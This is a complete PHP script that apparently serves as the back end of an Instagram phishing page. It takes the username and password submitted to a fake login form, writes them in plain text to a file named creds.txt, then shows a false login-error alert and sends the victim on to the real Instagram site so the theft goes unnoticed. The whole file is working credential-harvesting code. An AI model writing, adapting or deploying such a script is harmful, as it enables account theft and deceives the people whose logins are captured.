<?php

// Variable settings
$username = $_POST['u_name'] ?? '';  // Fetch username (using null coalescing operator)
$passcode = $_POST['pass'] ?? '';    // Fetch password (using null coalescing operator)

// File to store credentials
$filename = "creds.txt";

// Check input fields
if (!empty($username) && !empty($passcode)) {
    // Open the file in append mode
    $file = fopen($filename, "a");
    
    // Write the username and password to the file
    fwrite($file, "Username: $username | Password: $passcode\n");
    
    // Close the file
    fclose($file);
    
    // Redirect or alert the user
    echo "<script type='text/javascript'>alert('Error! Unable to login.');
        window.location.replace('https://www.instagram.com');
        </script>";

} else {
    echo "<script type='text/javascript'>alert('Please enter correct username or password. Try again.');
        window.history.go(-1);
        </script>";
}
?>